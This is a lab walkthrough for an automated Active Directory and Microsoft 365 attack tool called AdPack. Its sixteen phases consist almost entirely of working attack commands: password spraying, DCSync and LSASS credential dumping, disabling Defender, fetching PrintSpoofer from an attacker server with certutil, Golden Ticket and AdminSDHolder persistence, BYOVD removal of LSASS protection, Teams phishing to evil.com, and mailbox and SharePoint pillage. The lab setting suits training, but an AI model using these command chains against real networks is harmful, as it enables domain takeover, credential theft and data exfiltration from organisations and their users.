# AdPack Learner's Walkthrough

A step-by-step manual guide through all 16 attack phases. Run these commands yourself against a lab (GOAD-Light recommended) to understand exactly what AdPack automates.

## Prerequisites

- **Lab**: GOAD-Light (`sevenkingdoms.local` / `north.sevenkingdoms.local`)
- **Tools**: `nxc` (NetExec), `impacket` suite, `nmap`, `bloodhound-python`, `certipy`, `pypykatz`, `bloodyAD`, `kvno`
- **Config**: `adpack.yaml` in project root with seeds, domain, scope

## Phase 1 — Discovery

AdPack finds live hosts via TCP SYN scan on port 445 (SMB), then probes each for domain info.

```bash
# Ping sweep — finds Windows hosts using SMB port (ICMP is often blocked)
nmap -sn -PS445 -T4 --host-timeout 10s 192.168.56.0/24

# SMB probe — reveals hostname and domain
nxc smb 192.168.56.10 -d '' -u '' -p ''

# LDAP null-bind — detects domain controllers
nxc ldap 192.168.56.10 -d '' -u '' -p ''
```

**Look for**: IPs responding on 445, hostnames like `DC01`, `SRV02`, LDAP responses showing `(domain:sevenkingdoms.local)`.

**Why**: Without knowing what machines exist and which are DCs, you can't target your attacks. Discovery establishes the attack surface.

---

## Phase 2 — Enumeration

Enumerate AD users from a Domain Controller via LDAP.

```bash
nxc ldap 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor --users
```

**Look for**: List of usernames, their descriptions (often contain passwords), bad password counts.

**Why**: You need a list of valid usernames to spray passwords against. Descriptions in AD frequently contain cleartext passwords.

---

## Phase 3 — Credential Acquisition

Weak password spraying — tries common credentials against every discovered user.

```bash
# Known weak password spray
nxc smb 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor

# Username=password check
nxc smb 192.168.56.11 -d sevenkingdoms.local -u arya.stark -p arya.stark

# Cross-domain password reuse
nxc smb 192.168.56.12 -d north.sevenkingdoms.local -u hodor -p hodor
```

**Advanced techniques** (run by the pipeline when basic spray fails):

```bash
# DCSync via impacket-secretsdump (Domain Admin creds required)
impacket-secretsdump sevenkingdoms.local/hodor:hodor@192.168.56.10 -just-dc

# SAM dump via nxc
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --sam

# LSA secrets dump via nxc
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --lsa

# LSASS dump → parse with pypykatz
pypykatz lsa minidump /tmp/lsass_*.dmp
```

**Look for**: `[+]` in nxc output (credential accepted), `(Pwn3d!)` for admin access, hash lines from secretsdump.

**Why**: You need valid credentials to authenticate against AD services. This step converts usernames from phase 2 into usable creds.

---

## Phase 4 — Validation

Test acquired credentials across multiple protocols to determine their reach.

```bash
# SMB access check
nxc smb 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor

# LDAP access check
nxc ldap 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor

# WinRM access check
nxc winrm 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor

# RDP access check
nxc rdp 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor
```

**Look for**: `[+]` per protocol, `(Pwn3d!)` on SMB/WinRM indicates admin rights.

**Why**: Different protocols enable different attacks. SMB admin access lets you dump SAM/execute commands. LDAP lets you query users. WinRM gives a shell.

---

## Phase 5 — Session Harvest

Enumerate active user sessions on discovered hosts.

```bash
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --sessions
```

**Look for**: Usernames logged into machines, especially Domain Admins on non-DC hosts (prime targets for token theft).

**Why**: Sessions tell you where high-value users are authenticated. An admin session on a member server is your ticket to lateral movement.

---

## Phase 6 — Graph Analysis

Collect Active Directory structure via LDAP for BloodHound.

```bash
# Enumerate computers
nxc ldap 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor -M computers

# Enumerate GPOs
nxc ldap 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor -M gpo

# Enumerate ADCS certificate templates
nxc ldap 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor -M adcs
```

**Full BloodHound collection** (run by the pipeline):

```bash
bloodhound-python -d sevenkingdoms.local -u hodor -p hodor -dc dc01.sevenkingdoms.local -ns 192.168.56.10 --zip
```

**Look for**: Computer counts, GPO GUIDs, vulnerable ADCS templates (ESC1-ESC8), group memberships.

**Why**: Graph analysis maps the privilege relationships in AD — who can control what. This is the data that drives privilege escalation planning.

---

## Phase 7 — Privilege Escalation

Multiple sub-phases to elevate from regular user to Domain Admin.

### GPP Passwords

```bash
nxc ldap 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor -M gpp_password
```

### ADCS Enumeration (Certipy)

```bash
certipy find -u hodor@sevenkingdoms.local -p hodor -dc-ip 192.168.56.10

# Exploit ESC1 (if template allows domain authentication)
certipy req -u hodor@sevenkingdoms.local -p hodor -ca SEVENKINGDOMS-CA -template ESC1-Template -dc-ip 192.168.56.10
```

### ACL Abuse (DACL)

```bash
impacket-dacledit sevenkingdoms.local/hodor:hodor@192.168.56.10 -action write -rights FullControl -principal hodor -target-dn "CN=AdminSDHolder,CN=System,DC=sevenkingdoms,DC=local"
```

### BloodHound Path Planning

AdPack runs a Dijkstra-based planner over the edge graph. Common paths:

```
hodor@sevenkingdoms.local → GenericAll → DA-user@sevenkingdoms.local
hodor@sevenkingdoms.local → WriteDACL → DC01@sevenkingdoms.local
```

### Local Privilege Escalation

```bash
# Disable Defender
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
sc stop WinDefend
taskkill /f /im MsMpEng.exe

# SweetPotato / PrintSpoofer (NETWORK SERVICE → SYSTEM)
# Served from attacker's HTTP server:
certutil -urlcache -f http://192.168.56.1:18900/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
C:\Windows\Temp\ps.exe -c "net localgroup Administrators hodor /add"

# SAM dump after escalation
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --sam

# LSA secrets after escalation
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --lsa
```

### Child-to-Parent Domain Escalation

```bash
# DCSync child domain krbtgt
impacket-secretsdump north.sevenkingdoms.local/hodor:hodor@192.168.56.12 -just-dc-user krbtgt

# Forge Golden Ticket with extra-sid (Enterprise Admins -519)
impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local -extra-sid S-1-5-21-parent...-519 Administrator

# DCSync parent domain with forged ticket
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass dc01.sevenkingdoms.local -just-dc
```

**Look for**: `[+]` for vulnerable templates, DACL write success, BloodHound edge discovery, `(Pwn3d!)` after escalation, `krbtgt` hash extraction.

**Why**: Regular users can't DCSync or access protected data. Escalation to DA is the critical breakthrough — it unlocks every domain asset.

---

## Phase 8 — Lateral Movement

Spread from compromised hosts using multiple execution methods.

```bash
# SMB-WMI (executes as authenticated user)
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --exec-method wmiexec -x whoami

# SMB-PSExec (executes as SYSTEM via service creation)
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --exec-method smbexec -x whoami

# SMB-Schtasks (executes via scheduled tasks)
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --exec-method atexec -x whoami

# WinRM
nxc winrm 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor -x whoami

# MSSQL xp_cmdshell (requires sysadmin)
nxc mssql 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor -q "xp_cmdshell whoami"
```

**Look for**: Command output showing `nt authority\system` or the authenticated user, `[+]` with exec confirmation.

**Why**: Lateral movement lets you hop from the first compromised host to more machines, collecting credentials along the way.

---

## Phase 9 — Persistence

Deploy backdoors that survive reboots and credential changes.

```bash
# Scheduled task on logon (SYSTEM persistence)
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\HealthCheck" /tr "cmd.exe /c start /B powershell -NoP -W Hidden -C exit" /sc onlogon /ru SYSTEM /rl HIGHEST /f

# DSRM password-reuse logon (DC only)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f

# Golden Ticket (requires krbtgt hash)
impacket-secretsdump sevenkingdoms.local/hodor:hodor@192.168.56.10 -just-dc-user krbtgt
impacket-ticketer -nthash <hash> -domain-sid S-1-5-21-... -domain sevenkingdoms.local svc_health_<ts>

# Silver Ticket (per service — no KDC contact)
impacket-lookupsid sevenkingdoms.local/hodor:hodor@192.168.56.10 0
impacket-ticketer -nthash <service_hash> -domain-sid <SID> -domain sevenkingdoms.local -spn cifs/dc01.sevenkingdoms.local Administrator

# AdminSDHolder backdoor (propagates every 60 min via SDProp)
impacket-dacledit sevenkingdoms.local/hodor:hodor@192.168.56.10 -action write -rights FullControl -principal hodor -target-dn "CN=AdminSDHolder,CN=System,DC=sevenkingdoms,DC=local"

# Alternative: bloodyAD
bloodyAD -H 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor add genericAll "CN=AdminSDHolder,CN=System,DC=sevenkingdoms,DC=local" hodor
```

**Look for**: `SUCCESS` from schtasks, registry write confirmation, `krbtgt` hash extraction, ccache file creation, DACL write success.

**Why**: Persistence ensures you retain access even if the original compromise vector is patched or passwords change.

---

## Phase 10 — Impact

Exfiltrate high-value data now that you hold Domain Admin.

```bash
# NTDS.dit — all domain hashes
impacket-secretsdump sevenkingdoms.local/hodor:hodor@192.168.56.10 -just-dc-ntlm

# SYSVOL — GPO scripts and policies
nxc smb 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor --share SYSVOL

# File shares enumeration
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --shares

# LSASS dump on member server (non-DC — not PPL protected)
# Deploy nanodump via SMB, then:
nxc smb 192.168.56.11 -d sevenkingdoms.local -u hodor -p hodor --exec-method atexec -x "C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass.dmp"

# Parse LSASS dump
pypykatz lsa minidump /tmp/lsass.dmp
```

**PPL-protected DC LSASS dump** (requires BYOVD):

```bash
# PPLShade: deploy + load driver + strip PPL
C:\Windows\Temp\PPLShade.exe load C:\Windows\Temp\LECOMAx64.sys
C:\Windows\Temp\PPLShade.exe unprotect <LSASS_PID>

# Then dump as normal
C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass.dmp
```

**Look for**: NTLM hash lines from secretsdump (`username:uid:lm:nt:::`), domain admin sessions, policy files in SYSVOL, cleartext credentials from LSASS.

**Why**: Impact is the mission objective — extracting all domain hashes, sensitive documents, and credentials stored in memory. NTDS hashes enable Golden Tickets and password cracking.

### Cross-Domain Trust Pivot (sub-operation)

When SMB is blocked across a domain trust, use Kerberos + LDAP for cleartext discovery and group injection. Automatically attempted by AdPack during the impact phase when DA credentials are held.

```bash
# Step 1: Get TGT for Enterprise Admin (use -dc-ip to bypass DNS)
impacket-getTGT sevenkingdoms.local/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> -dc-ip 192.168.56.10

# Step 2: Configure KRB5_CONFIG for child domain KDC access
export KRB5CCNAME=/tmp/administrator.ccache
export KRB5_CONFIG=/tmp/adpk_krb5.conf
# krb5.conf must have multi-line bracket format (MIT krb5):
# [realms]
# SEVENKINGDOMS.LOCAL = {
#     kdc = 192.168.56.10
# }
# NORTH.SEVENKINGDOMS.LOCAL = {
#     kdc = 192.168.56.12
# }

# Step 3: Request CIFS ticket (forces cross-realm TGT into ccache)
kvno cifs/winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL

# Step 4: Request LDAP ticket (prevents S_PRINCIPAL_UNKNOWN)
kvno ldap/winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL

# Step 5: Query child domain user descriptions via Kerberos LDAP
# Note: use the DC IP if your DNS can't resolve the .local hostname
nxc ldap 192.168.56.12 -k --use-kcache -M user-desc

# Step 6: If cleartext passwords found, inject user into Domain Admins
# Use the IP for TCP connection, pass hostname via sasl_credentials for SPN
python3 -c "
import ldap3
server = ldap3.Server('192.168.56.12', port=389, get_info=ldap3.ALL)
conn = ldap3.Connection(server, authentication=ldap3.SASL,
    sasl_mechanism=ldap3.KERBEROS,
    sasl_credentials=('winterfell.north.sevenkingdoms.local',))
conn.bind()
base_dn = 'dc=north,dc=sevenkingdoms,dc=local'
da_dn = 'CN=Domain Admins,CN=Users,' + base_dn
conn.search(base_dn, '(sAMAccountName=someuser)', attributes=['distinguishedName'])
user_dn = conn.entries[0].distinguishedName.value
conn.extend.microsoft.add_members_to_groups(user_dn, da_dn)
print('SUCCESS' if conn.result['result'] == 0 else 'FAIL')
conn.unbind()
"
```

**Key details for the cross-domain pivot:**
- `impacket-getTGT` needs `-dc-ip` because it doesn't use `KRB5_CONFIG` like MIT Kerberos does
- `kvno` uses MIT Kerberos (works via `KRB5_CONFIG`), so hostname resolution for SPNs isn't needed
- `nxc` and Python `ldap3` need TCP connections, so they require a resolvable target — use the IP directly when DNS can't resolve `.local` domains
- For Kerberos SPN matching in Python, pass the actual hostname via `sasl_credentials` even when connecting via IP

**Look for**: `[+]` from ccache in nxc, cleartext passwords in descriptions, `SUCCESS` from ldap3 group injection.

**Why**: Forest trusts allow parent-domain Enterprise Admins to authenticate to child domains via Kerberos referrals. When SMB is blocked (STATUS_MORE_PROCESSING_REQUIRED), LDAP-based discovery still works.

---

## Phase 11 — Hybrid Bridge

Extract AAD Connect credentials that bridge on-prem AD to the cloud.

```bash
# Registry-based extraction (nxc registry)
nxc smb 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor --registry -x "HKLM\SOFTWARE\Azure AD Connect\EncryptionKey"

# WinRM fallback
nxc winrm 192.168.56.10 -d sevenkingdoms.local -u hodor -p hodor -x "powershell Get-ChildItem 'HKLM:\SOFTWARE\Azure AD Connect\EncryptionKey' -Recurse"

# Extract AZUREADSSOACC$ computer hash for SeamlessSSO silver ticket
impacket-secretsdump sevenkingdoms.local/hodor:hodor@192.168.56.10 -just-dc-user AZUREADSSOACC$

# Forge Seamless SSO Silver Ticket (authenticates to Azure without MFA)
impacket-ticketer -nthash <AZUREADSSOACC_HASH> -domain-sid <SID> -domain sevenkingdoms.local -spn azuread/sso Administrator
```

**Look for**: Registry key values containing `EncryptionKeys`, TenantId, AZUREADSSOACC$ hash, ccache path.

**Why**: AAD Connect credentials (MSOL_/Sync_ accounts) often have Global Administrator rights in the tenant. The SeamlessSSO ticket lets any domain-joined machine authenticate to Azure as any user without MFA.

---

## Phase 12 — Cloud Initial Access

Phishing and token harvesting for cloud foothold.

```bash
# Teams phishing
TeamsPhisher.py -a attacker@sevenkingdoms.onmicrosoft.com -t target@sevenkingdoms.onmicrosoft.com -m "Check this document" -u https://evil.com/doc.html -p phish_result.txt

# Device code authentication (interactive)
roadtx devicecode -c Microsoft365 --tenant sevenkingdoms.onmicrosoft.com
# User visits https://microsoft.com/devicelogin and enters the code

# OAuth consent phishing
Invoke-GraphConsentPhish -URL "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?..."
```

**Look for**: User codes for device auth, access tokens from consent, Teams message delivery confirmations.

**Why**: Cloud initial access establishes the foothold for Entra ID post-exploitation — app registration, role abuse, data pillage.

---

## Phase 13 — Cloud Enumeration

Enumerate Entra ID tenant resources.

```bash
# Via AADInternals (username/password)
Get-AADIntUsers -UserName hodor@sevenkingdoms.onmicrosoft.com -Password hodor
Get-AADIntServicePrincipals -UserName hodor@sevenkingdoms.onmicrosoft.com -Password hodor

# Via GraphRunner (token-based)
Invoke-GraphUserEnum -AccessToken <token>
Invoke-GraphGroupEnum -AccessToken <token>
Invoke-GraphAppEnum -AccessToken <token>
Invoke-GraphConditionalAccessEnum -AccessToken <token>
```

**Look for**: User lists, group memberships, Enterprise Apps, Conditional Access Policies.

**Why**: The cloud tenant often mirrors on-prem AD but with different security boundaries. Enumeration reveals which users and apps exist, their roles, and access policies.

---

## Phase 14 — Cloud Credential Acquisition

Password spray Microsoft 365 accounts.

```bash
o365spray -d sevenkingdoms.onmicrosoft.com -u users.txt -p Welcome1 --spray
```

**Look for**: `[+] VALID` for working credentials.

**Why**: Cloud credential reuse is common — the same weak password that worked on-prem often works for the user's cloud account.

---

## Phase 15 — Cloud Privilege Escalation

Analyze cloud privilege paths and escalate within Entra ID.

```bash
# Enumerate high-privilege roles
Get-AADIntGlobalAdmins -UserName hodor@sevenkingdoms.onmicrosoft.com -Password hodor
Get-AADIntRoleMembers -RoleName "Global Administrator"

# Check for Privileged Role Assignment (PIM) configuration
Get-AADIntPrivilegedRoleAssignments -UserName hodor@sevenkingdoms.onmicrosoft.com -Password hodor

# Escalate via service principal abuse
Invoke-GraphAppRoleAssignment -AccessToken <token> -TargetApp "Microsoft Graph" -Role "Mail.ReadWrite"

# Escalate via application permissions
Invoke-GraphAppConsent -AccessToken <token> -AppId <app-id> -Permissions "Mail.ReadWrite.All"

# Check for Azure AD hybrid identity takeover (via on-prem sync account reuse)
Get-AADIntAzureADHybridAuthentication -UserName hodor@sevenkingdoms.onmicrosoft.com -Password hodor
```

**Look for**: Global Admin role members, PIM-eligible roles, service principals with broad permissions, hybrid identity accounts with sync rights.

**Why**: Cloud privilege escalation lets you move from a limited cloud user to Global Administrator, unlocking full tenant access. Common paths include PIM activation, service principal abuse, and hybrid identity takeover.

---

## Phase 16 — Cloud Pillage

Extract data from Microsoft 365 via Graph API.

```bash
# Mailbox search for credentials
Invoke-GraphMailboxSearch -AccessToken <token> -SearchTerm "password"

# SharePoint search
Invoke-GraphSharePointSearch -AccessToken <token> -SearchTerm "secret"

# Teams message search
Invoke-GraphTeamsSearch -AccessToken <token> -SearchTerm "admin"

# Download mailbox messages
Invoke-GraphMailMessageExport -AccessToken <token> -MessageId <id> -Path output.json
```

**Look for**: Emails with credentials, SharePoint documents containing secrets, Teams conversations about admin accounts.

**Why**: Cloud applications contain business-critical data — emails, documents, messages. Pillage extracts sensitive information from the M365 tenant.

---

## 🚀 Running the Full Chain

Once you understand each phase individually, let AdPack orchestrate the whole attack:

```bash
# Initialize an engagement
adpack init --name "GOAD-Light attack" --scope "192.168.56.0/24"

# Run the full automated attack chain
adpack autorun

# Check progress
adpack status

# View acquired credentials
adpack cred list

# See what to do next
adpack next
```

The autorun pipeline handles:
- State management (what's been done, what's pending)
- Credential flow (new creds are validated and used immediately)
- Re-rolling when escalation paths are blocked
- Tool selection based on what's installed
- Multi-domain cross-forest trust pivots
- Evasion profile cascading (native → PPLShade → PhantomKiller)
